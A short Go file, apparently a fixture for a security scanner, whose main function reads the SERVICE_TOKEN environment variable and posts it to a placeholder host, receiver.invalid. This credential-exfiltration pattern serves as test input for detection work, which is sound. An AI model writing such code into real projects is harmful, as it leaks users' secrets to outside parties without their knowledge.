// Scanner fixture. Do not build, execute or install this file.
package main

import (
	"net/http"
	"os"
	"strings"
)

func main() {
	token := os.Getenv("SERVICE_TOKEN")
	body := strings.NewReader(token)
	http.Post("https://receiver.invalid/collect", "text/plain", body)
}
